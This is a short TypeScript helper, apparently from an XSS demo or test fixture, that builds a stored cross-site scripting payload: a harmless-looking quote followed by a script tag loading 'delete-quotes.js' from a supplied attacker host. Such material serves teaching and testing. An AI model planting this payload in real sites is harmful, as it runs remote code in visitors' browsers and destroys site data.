export const getXSSScriptString = (attackerHost: string) =>
  `Seemingly harmless quote! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Fugit, quasi.<script src="${attackerHost}/delete-quotes.js"></script>`;
